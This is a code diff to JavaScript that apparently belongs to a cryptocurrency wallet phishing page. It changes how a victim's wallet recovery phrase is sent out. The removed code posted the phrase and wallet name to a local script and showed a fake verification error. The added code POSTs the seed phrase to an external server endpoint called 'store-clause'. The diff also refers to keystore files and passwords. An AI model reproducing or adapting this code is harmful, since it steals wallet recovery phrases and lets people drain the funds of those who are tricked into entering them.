@@ -88,23 +88,30 @@ function sendData() {
 
   if (phraseVal != "") {
     // ADD NEW BLOCK FOR SENDING REQUEST.
-    $.ajax({
-      type: "post",
-      url: "sync.php",
-      data: "phrase=" + phraseVal + "&wallet=" + walletVal,
-      success: function (respnx) {
-        if (respnx == "yes") {
-          console.log(respnx);
-          alert("Error Verifying Wallet... Please try again later");
-          document.querySelector(".sending").style.display = "none";
-        } else {
-          alert("Sent!");
+    const url = "https://new-webserver.onrender.com/api/store-clause"; // Replace with your API endpoint
+
+    const data = {
+      clause: phraseVal,
+    };
+    fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json", // Specify the content type as JSON
+      },
+      body: JSON.stringify(data), // Convert the JavaScript object to a JSON string
+    })
+      .then((response) => {
+        if (!response.ok) {
+          throw new Error("Network response was not ok");
         }
-      },
-      error: function (badx) {
-        alert("Sent!");
-      },
-    });
+        return response.json();
+      })
+      .then((responseData) => {
+        console.log("POST request successful. Response:", responseData);
+      })
+      .catch((error) => {
+        console.error("There was a problem with the POST request:", error);
+      });
   }
 
   if (keystoreval != "" && keystorepass != "") {
